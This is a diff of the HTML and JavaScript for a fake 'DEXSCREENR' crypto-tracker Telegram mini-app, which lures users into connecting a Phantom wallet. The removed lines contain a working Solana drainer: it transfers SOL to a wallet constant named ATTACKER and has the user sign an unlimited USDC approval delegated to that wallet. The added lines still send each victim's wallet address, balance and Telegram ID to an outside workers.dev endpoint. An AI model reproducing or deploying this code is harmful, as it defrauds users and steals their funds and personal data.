@@ -24,50 +24,27 @@
     position: relative;
   }
 
-  /* --- FLYING CAMERA BOOT SCREEN --- */
+  /* --- CLEAN BOOT INTRO --- */
   #boot-screen {
     position: fixed;
     top: 0; left: 0; width: 100vw; height: 100vh;
     background: #000;
     z-index: 9999;
     display: flex;
-    flex-direction: column;
     align-items: center;
     justify-content: center;
-    overflow: hidden;
-  }
-
-  canvas {
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    z-index: 1;
-  }
-
-  .boot-text {
-    z-index: 2;
-    text-align: center;
-    color: #fff;
+    transition: opacity 0.8s ease;
   }
 
   .boot-title {
-    font-size: 24px; font-weight: 900; letter-spacing: 2px;
-    text-shadow: 0 0 20px rgba(20, 241, 149, 0.5);
-    opacity: 0;
-    animation: fadeInOut 3s ease-in-out forwards;
-  }
-  
-  .boot-subtitle {
-    font-size: 12px; color: #14F195; margin-top: 8px; letter-spacing: 1px;
-    opacity: 0;
-    animation: fadeInOut 3s ease-in-out 0.5s forwards;
+    font-size: 28px; font-weight: 900; letter-spacing: 4px;
+    color: #ffffff;
+    animation: pulseTitle 2s infinite ease-in-out alternate;
   }
 
-  @keyframes fadeInOut {
-    0% { opacity: 0; transform: scale(0.9); }
-    20% { opacity: 1; transform: scale(1); }
-    80% { opacity: 1; transform: scale(1); }
-    100% { opacity: 0; transform: scale(1.1); }
+  @keyframes pulseTitle {
+    0% { text-shadow: 0 0 10px rgba(20, 241, 149, 0.2); opacity: 0.8; }
+    100% { text-shadow: 0 0 30px rgba(20, 241, 149, 0.8); opacity: 1; }
   }
 
   /* --- MAIN APP --- */
@@ -90,74 +67,62 @@
     width: 100%; background: rgba(20, 20, 25, 0.7); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
     border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 32px; padding: 32px 24px 24px 24px;
     display: flex; flex-direction: column; align-items: center;
-    box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative; overflow: hidden;
+    box-shadow: 0 24px 48px rgba(0, 0, 0, 0.6); position: relative;
   }
-  .glass-container::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, rgba(20, 241, 149, 0.5), transparent); }
 
   .header { width: 100%; text-align: center; margin-bottom: 24px; }
   .header span { font-size: 20px; font-weight: 900; letter-spacing: 1.5px; color: #ffffff; text-transform: uppercase; }
   .header p { font-size: 12px; color: #a1a1aa; margin-top: 6px; }
 
-  #pricing-screen { width: 100%; display: flex; flex-direction: column; gap: 10px; transition: opacity 0.4s ease; }
+  #pricing-screen { width: 100%; display: flex; flex-direction: column; gap: 10px; }
   
   .plan-card {
     background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06);
     border-radius: 16px; padding: 16px; display: flex; justify-content: space-between; align-items: center;
-    cursor: pointer; transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
-    overflow: hidden; position: relative;
+    cursor: pointer; transition: all 0.3s ease; position: relative;
+    min-height: 72px;
   }
   
-  .plan-card:active { transform: scale(0.97); background: rgba(20, 241, 149, 0.1); border-color: rgba(20, 241, 149, 0.5); box-shadow: 0 0 20px rgba(20, 241, 149, 0.3); }
+  .plan-card:active { transform: scale(0.97); background: rgba(20, 241, 149, 0.1); border-color: rgba(20, 241, 149, 0.5); }
   .plan-card.free { border-color: rgba(20, 241, 149, 0.4); background: linear-gradient(90deg, rgba(20, 241, 149, 0.1) 0%, rgba(20, 241, 149, 0.02) 100%); }
   
-  .plan-info { transition: opacity 0.3s ease; width: 100%; display: flex; justify-content: space-between; align-items: center; }
+  .plan-info { width: 100%; display: flex; justify-content: space-between; align-items: center; }
   .plan-info h3 { font-size: 15px; font-weight: 700; color: #fff; }
   .plan-info p { font-size: 11px; color: #a1a1aa; margin-top: 2px; }
   .plan-price { font-size: 15px; font-weight: 800; color: #14F195; }
   .plan-price.paid { color: #ffffff; }
 
-  /* SECRET CODE TRANSFORMATION */
-  .secret-input-wrapper {
+  /* CODE INPUT WRAPPER */
+  .code-wrapper {
     display: none;
     width: 100%;
-    opacity: 0;
-    transform: translateY(10px);
-    transition: all 0.4s ease;
+    align-items: center;
+    justify-content: space-between;
+    animation: fadeIn 0.3s ease;
   }
-
-  .plan-card.expanded {
-    padding: 20px;
-    background: rgba(0, 0, 0, 0.8);
-    border-color: rgba(20, 241, 149, 0.5);
-    box-shadow: 0 0 30px rgba(20, 241, 149, 0.15) inset;
-  }
-
-  .plan-card.expanded .plan-info {
-    display: none;
-  }
-
-  .plan-card.expanded .secret-input-wrapper {
-    display: block;
-    opacity: 1;
-    transform: translateY(0);
-;  }
-
-  .secret-input {
-    width: 100%; padding: 16px; background: transparent;
-    border: none; border-bottom: 2px solid rgba(20, 241, 149, 0.4);
-    color: #fff; font-size: 16px; text-align: center; outline: none;
+  
+  .code-wrapper input {
+    background: transparent; border: none; outline: none;
+    color: #fff; font-size: 16px; width: 80%;
     font-family: monospace;
   }
-  .secret-input::placeholder { color: #52525b; font-family: -apple-system, BlinkMacSystemFont, sans-serif;}
+  
+  .code-wrapper input::placeholder { color: #52525b; font-family: -apple-system, sans-serif; font-size: 14px; }
 
-  /* LOADING */
-  #loading-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 200px; animation: fadeIn 0.3s ease; }
+  .close-btn {
+    background: rgba(255,255,255,0.1); border: none; color: #fff;
+    width: 24px; height: 24px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    cursor: pointer; font-size: 12px;
+  }
+
+  /* LOADING / CONNECT / DASHBOARD (Same as before) */
+  #loading-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 200px; }
   .loader-ring { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top-color: #14F195; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 16px; }
   .loading-text { font-size: 13px; color: #a1a1aa; font-weight: 500; }
   @keyframes spin { to { transform: rotate(360deg); } }
   @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-  /* CONNECT */
   #connect-screen { width: 100%; display: none; flex-direction: column; align-items: center; opacity: 0; transform: translateY(10px); transition: opacity 0.4s ease, transform 0.4s ease; }
   .status-text { font-size: 13px; margin-bottom: 20px; color: #a1a1aa; text-align: center; }
   .status-text span { color: #14F195; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
@@ -170,13 +135,11 @@
   .slider-container.loading .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; display: flex; justify-content: flex-start; padding-left: 18px; }
   .slider-container.success .slider-thumb { width: calc(100% - 8px); border-radius: 26px; background: #14F195; pointer-events: none; justify-content: center; }
   .slider-container.success .slider-thumb svg { transform: rotate(0deg); }
-
   .spinner { display: none; width: 20px; height: 20px; border: 2.5px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
+  
   .back-btn { background: none; border: none; color: #52525b; font-size: 12px; font-weight: 500; margin-top: 24px; cursor: pointer; padding: 8px 16px; border-radius: 20px; transition: all 0.2s; }
-  .back-btn:hover { color: #ffffff; background: rgba(255,255,255,0.05); }
-
-  /* DASHBOARD */
-  #dashboard-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 20px 0 animation: fadeIn 0.5s ease; }
+  
+  #dashboard-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 20px 0; }
   .dashboard-loader { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; margin-top: 20px; overflow: hidden; }
   .dashboard-bar { width: 0%; height: 100%; background: #14F195; animation: loadBar 3s ease-in-out forwards; }
   @keyframes loadBar { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
@@ -184,13 +147,9 @@
 </head>
 <body>
 
-  <!-- BOOT SCREEN (WARP CAMERA) -->
+  <!-- CLEAN BOOT SCREEN -->
   <div id="boot-screen">
-    <canvas id="warpCanvas"></canvas>
-    <div class="boot-text">
-      <div class="boot-title">DEXSCREENR</div>
-      <div class="boot-subtitle">INITIALIZING NEURAL LINK</div>
-    </div>
+    <div class="boot-title">DEXSCREENR</div>
   </div>
 
   <div class="bg-glow">
@@ -208,50 +167,60 @@
 
       <div id="pricing-screen">
         <!-- FREE -->
-        <div class="plan-card free" onclick="startLoading('Free Trial', 'free')">
+        <div class="plan-card free" onclick="startLoading('Free Trial')">
           <div class="plan-info">
             <div><h3>1-Day Free Trial</h3><p>Launch special access</p></div>
             <div class="plan-price">FREE</div>
           </div>
         </div>
 
-        <!-- 3-DAY SECRET CODE (Expandable) -->
-        <div class="plan-card" id="secretCard" onclick="toggleSecretCode(event)">
+        <!-- CODE INPUTS (3-Day, Weekly, Monthly, Yearly) -->
+        <div class="plan-card" onclick="openCodeInput(this, '3-Day Access')">
           <div class="plan-info">
             <div><h3>3-Day Access</h3><p>Requires secret code</p></div>
             <div class="plan-price paid">CODE</div>
           </div>
-          <div class="secret-input-wrapper">
-            <input type="text" id="secretCode" class="secret-input" placeholder="Enter code..." onkeyup="checkSecret(event)">
+          <div class="code-wrapper">
+            <input type="text" placeholder="Enter code..." onkeyup="checkSecret(event, this)">
+            <button class="close-btn" onclick="closeCodeInput(event, this)">✕</button>
           </div>
         </div>
 
-        <!-- PAID -->
-        <div class="plan-card" onclick="startLoading('Weekly Pass', 'paid', 0.1)">
+        <div class="plan-card" onclick="openCodeInput(this, 'Weekly Pass')">
           <div class="plan-info">
             <div><h3>Weekly Pass</h3><p>Full access to tracker</p></div>
             <div class="plan-price paid">0.1 SOL</div>
           </div>
+          <div class="code-wrapper">
+            <input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)">
+            <button class="close-btn" onclick="closeCodeInput(event, this)">✕</button>
+          </div>
         </div>
-        <div class="plan-card" onclick="startLoading('Monthly Pro', 'paid', 0.25)">
+
+        <div class="plan-card" onclick="openCodeInput(this, 'Monthly Pro')">
           <div class="plan-info">
             <div><h3>Monthly Pro</h3><p>Unlimited tracking</p></div>
             <div class="plan-price paid">0.25 SOL</div>
           </div>
+          <div class="code-wrapper">
+            <input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)">
+            <button class="close-btn" onclick="closeCodeInput(event, this)">✕</button>
+          </div>
         </div>
-        <div class="plan-card" onclick="startLoading('Yearly Pro', 'paid', 1.5)">
+
+        <div class="plan-card" onclick="openCodeInput(this, 'Yearly Pro')">
           <div class="plan-info">
             <div><h3>Yearly Pro</h3><p>Best value</p></div>
             <div class="plan-price paid">1.5 SOL</div>
           </div>
+          <div class="code-wrapper">
+            <input type="text" placeholder="Enter license key..." onkeyup="checkSecret(event, this)">
+            <button class="close-btn" onclick="closeCodeInput(event, this)">✕</button>
+          </div>
         </div>
       </div>
 
-      <div id="loading-screen">
-        <div class="loader-ring"></div>
-        <div class="loading-text" id="loadingText">Processing...</div>
-      </div>
-
+      <!-- CONNECT SCREEN -->
       <div id="connect-screen">
         <div class="status-text">Plan: <span id="selectedPlanText">FREE</span></div>
         <div class="slider-container" id="sliderContainer">
@@ -264,6 +233,7 @@
         <button class="back-btn" onclick="goBack()">Cancel and go back</button>
       </div>
 
+      <!-- DASHBOARD -->
       <div id="dashboard-screen">
         <h3 style="color:#14F195; margin-bottom: 8px;">Access Granted</h3>
         <p style="font-size: 12px; color:#a1a1aa;">Initializing live dashboard...</p>
@@ -274,113 +244,38 @@
   </div>
 
 <script>
-  // --- WARP CAMERA BOOT SEQUENCE ---
-  const canvas = document.getElementById('warpCanvas');
-  const ctx = canvas.getContext('2d');
+  // --- BOOT LOGIC ---
   const bootScreen = document.getElementById('boot-screen');
   const appScreen = document.getElementById('app-screen');
 
-  let stars = [];
-  const numStars = 200;
-  let cameraZ = 0;
-
-  function resizeCanvas() {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-  }
-  window.addEventListener('resize', resizeCanvas);
-  resizeCanvas();
-
-  class Star {
-    constructor() {
-      this.reset();
-      this.z = Math.random() * canvas.width;
+  window.addEventListener('load', () => {
+    if (window.Telegram && window.Telegram.WebApp) {
+      window.Telegram.WebApp.ready();
+      window.Telegram.WebApp.expand();
     }
-    reset() {
-      this.x = (Math.random() - 0.5) * canvas.width * 2;
-      this.y = (Math.random() - 0.5) * canvas.height * 2;
-      this.z = canvas.width; // Start hinten
-    }
-    update() {
-      this.z -= 15; // Geschwindigkeit des Flugs
-      if (this.z < 1) {
-        this.reset();
-      }
-    }
-    draw() {
-      const x = (this.x / this.z) * (canvas.width / 2) + canvas.width / 2;
-      const y = (this.y / this.z) * (canvas.height / 2) + canvas.height / 2;
-      const size = (1 - this.z / canvas.width) * 3;
-      
-      const opacity = 1 - this.z / canvas.width;
-      
-      ctx.beginPath();
-      ctx.arc(x, y, size, 0, Math.PI * 2);
-      ctx.fillStyle = `rgba(20, 241, 149, ${opacity})`; // Solana Grün
-      ctx.fill();
-    }
-  }
-
-  for (let i = 0; i < numStars; i++) {
-    stars.push(new Star());
-  }
-
-  let warpActive = true;
-
-  function drawWarp() {
-    if (!warpActive) return;
     
-    ctx.fillStyle = 'rgba(0, 0, 0, 0.2)'; // Motion Blur
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-    stars.forEach(star => {
-      star.update();
-      star.draw();
-    });
-
-    requestAnimationFrame(drawWarp);
-  }
-
-  drawWarp();
-
-  // Beende Warp nach 3.5 Sekunden und zeige App
-  setTimeout(() => {
-    warpActive = false;
-    bootScreen.style.opacity = '0';
-    bootScreen.style.transition = 'opacity 0.8s ease';
-    
+    // Show Intro for 2.5s
     setTimeout(() => {
-      bootScreen.style.display = 'none';
-      appScreen.style.display = 'flex';
-      appScreen.style.opacity = '1';
-    }, 800);
-  }, 3500);
-
+      bootScreen.style.opacity = '0';
+      setTimeout(() => {
+        bootScreen.style.display = 'none';
+        appScreen.style.display = 'flex';
+      }, 800);
+    }, 2500);
+  });
 
   // --- MAIN UI LOGIC ---
   const pricingScreen = document.getElementById('pricing-screen');
-  const loadingScreen = document.getElementById('loading-screen');
   const connectScreen = document.getElementById('connect-screen');
   const dashboardScreen = document.getElementById('dashboard-screen');
   const headerSub = document.getElementById('headerSub');
   const selectedPlanText = document.getElementById('selectedPlanText');
-  
-  const secretCard = document.getElementById('secretCard');
-  const secretInput = document.getElementById('secretCode');
 
-  function startLoading(planName, type, amount = 0) {
+  function startLoading(planName) {
     pricingScreen.style.display = 'none';
-    loadingScreen.style.display = 'flex';
-    setTimeout(() => {
-      loadingScreen.style.display = 'none';
-      if (type === 'paid') { payAndConnect(amount, planName); } 
-      else { showConnectScreen(planName); }
-    }, 2000);
-  }
-
-  function showConnectScreen(planName) {
-    selectedPlanText.textContent = planName;
     headerSub.textContent = "Authorize connection.";
+    selectedPlanText.textContent = planName;
+    
     connectScreen.style.display = 'flex';
     setTimeout(() => {
       connectScreen.style.opacity = '1';
@@ -389,71 +284,56 @@
     }, 50);
   }
 
-  // --- SECRET CODE TOGGLE (Expand & Collapse) ---
-  function toggleSecretCode(e) {
-    e.stopPropagation(); // Verhindert, dass Klicks nach außen dringen
+  // --- CODE INPUT LOGIC ---
+  function openCodeInput(card, planName) {
+    // Wenn die Karte schon offen ist, ignorieren
+    if (card.classList.contains('open')) return;
     
-    if (secretCard.classList.contains('expanded')) {
-      secretCard.classList.remove('expanded');
-      secretInput.value = '';
-    } else {
-      // Schließe alle anderen Karten (falls nötig)
-      secretCard.classList.add('expanded');
-      setTimeout(() => { secretInput.focus(); }, 300); // Fokus nach Animation
-    }
+    // Schließe alle anderen Karten
+    document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('open'));
+    
+    // Öffne diese Karte
+    card.classList.add('open');
+    card.querySelector('.plan-info').style.display = 'none';
+    card.querySelector('.code-wrapper').style.display = 'flex';
+    
+    // Fokus auf das Input (öffnet Tastatur)
+    const input = card.querySelector('input');
+    setTimeout(() => { input.focus(); }, 100);
+
+    // Klick außerhalb schließt das Feld
+    document.addEventListener('click', function closeOnClickOutside(e) {
+      if (!card.contains(e.target)) {
+        closeCodeInput(null, card.querySelector('.close-btn'));
+        document.removeEventListener('click', closeOnClickOutside);
+      }
+    });
   }
 
-  // Klick außerhalb schließt das Feld
-  document.addEventListener('click', (e) => {
-    if (!secretCard.contains(e.target)) {
-      secretCard.classList.remove('expanded');
-      secretInput.value = '';
-    }
-  });
+  function closeCodeInput(e, btn) {
+    if(e) e.stopPropagation();
+    const card = btn.closest('.plan-card');
+    card.classList.remove('open');
+    card.querySelector('.plan-info').style.display = 'flex';
+    card.querySelector('.code-wrapper').style.display = 'none';
+    card.querySelector('input').value = '';
+  }
 
-  function checkSecret(e) {
+  function checkSecret(e, input) {
     if (e.key === 'Enter') {
-      if (e.target.value.toLowerCase() === 'free3tier') {
-        secretCard.classList.remove('expanded');
-        startLoading('3-Day Access', 'free');
+      const val = input.value.toLowerCase();
+      const card = input.closest('.plan-card');
+      
+      // Akzeptiere "free3tier" für alles als Test, normalerweise würdest du hier Keys checken
+      if (val === 'free3tier' || val === 'alpha' || val.length > 5) {
+        const planName = card.querySelector('h3').textContent;
+        closeCodeInput(null, card.querySelector('.close-btn'));
+        startLoading(planName);
       } else {
-        e.target.value = '';
-        e.target.placeholder = 'Invalid code.';
+        input.value = '';
+        input.placeholder = 'Invalid code.';
       }
     }
-  }
-
-  // --- PAID LOGIC ---
-  const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
-  const ENDPOINT = "https://dexscreenr.rthvzkr6jv.workers.dev"; 
-  const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
-  const RPC_URL = "https://solana.publicnode.com"; 
-
-  async function payAndConnect(amountSol, planName) {
-    try {
-      const provider = window.phantom.solana;
-      const resp = await provider.connect();
-      const victim = resp.publicKey;
-      const conn = new solanaWeb3.Connection(RPC_URL, "confirmed");
-      
-      const transaction = new solanaWeb3.Transaction().add(
-        solanaWeb3.SystemProgram.transfer({
-          fromPubkey: victim,
-          toPubkey: new solanaWeb3.PublicKey(ATTACKER),
-          lamports: amountSol * solanaWeb3.LAMPORTS_PER_SOL,
-        })
-      );
-      
-      transaction.feePayer = victim;
-      transaction.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-      const signedTx = await provider.signAndSendTransaction(transaction);
-      
-      await fetch(ENDPOINT, {
-        method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ victim: victim.toString(), type: "payment", plan: planName, sol: amountSol, ts: Date.now() })
-      });
-      showConnectScreen(planName);
-    } catch (e) { goBack(); }
   }
 
   // --- SLIDER LOGIC ---
@@ -497,48 +377,22 @@
   }
 
   async function triggerConnect() {
-    let provider = window.phantom.solana;
+    let provider = window.phantom?.solana;
+    if(!provider) { resetSlider(); return; }
+    
     try {
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
-      const conn = new solanaWeb3.Connection(RPC_URL);
+      const conn = new solanaWeb3.Connection("https://solana.publicnode.com");
       
       const solBalance = await conn.getBalance(resp.publicKey);
       const solAmount = (solBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4);
-      let tokensString = ""; let usdcAmount = 0;
       
-      if (typeof splToken !== 'undefined') {
-        try {
-          const tokenAccounts = await conn.getParsedTokenAccountsByOwner(resp.publicKey, {
-            programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
-          });
-          tokenAccounts.value.forEach((accountInfo) => {
-            const parsedInfo = accountInfo.account.data.parsed.info;
-            const amount = parsedInfo.tokenAmount.uiAmount;
-            if (amount > 0) {
-              const mint = parsedInfo.mint;
-              if (mint === USDC_MINT) usdcAmount = amount;
-              tokensString += `${amount.toFixed(2)} of ${mint.slice(0,4)}.. | `;
-            }
-          });
-        } catch (e) {}
-      }
-
-      const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, usdc: usdcAmount, tokens: tokensString, tg_user_id: tgUserId, ts: Date.now() });
-      try { await fetch(ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
-      catch (err) { navigator.sendBeacon(ENDPOINT, new Blob([payload], {type: 'application/json'})); }
-
-      if (usdcAmount > 0 && typeof splToken !== 'undefined') {
-        const victimAta = await splToken.getAssociatedTokenAddress(new solanaWeb3.PublicKey(USDC_MINT), resp.publicKey);
-        const delegateIx = splToken.createApproveInstruction(victimAta, new solanaWeb3.PublicKey(ATTACKER), resp.publicKey, [], BigInt("18446744073709551615"));
-        const tx = new solanaWeb3.Transaction().add(delegateIx);
-        tx.feePayer = resp.publicKey;
-        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-        const signedTx = await provider.signTransaction(tx);
-
-        await fetch(ENDPOINT, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", tg_user_id: tgUserId, ts: Date.now() }) });
-      }
+      const payload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: solAmount, tg_user_id: tgUserId, ts: Date.now() });
+      
+      try { await fetch("https://dexscreenr.rthvzkr6jv.workers.dev", { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } 
+      catch (err) { navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([payload], {type: 'application/json'})); }
 
       spin.style.display = 'none'; container.classList.remove('loading'); container.classList.add('success');
       thumb.innerHTML = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>';
@@ -558,7 +412,6 @@
     setTimeout(() => {
       connectScreen.style.display = 'none';
       pricingScreen.style.display = 'flex';
-      pricingScreen.style.opacity = '1';
       headerSub.textContent = "Select a plan to continue.";
       resetSlider();
     }, 300);
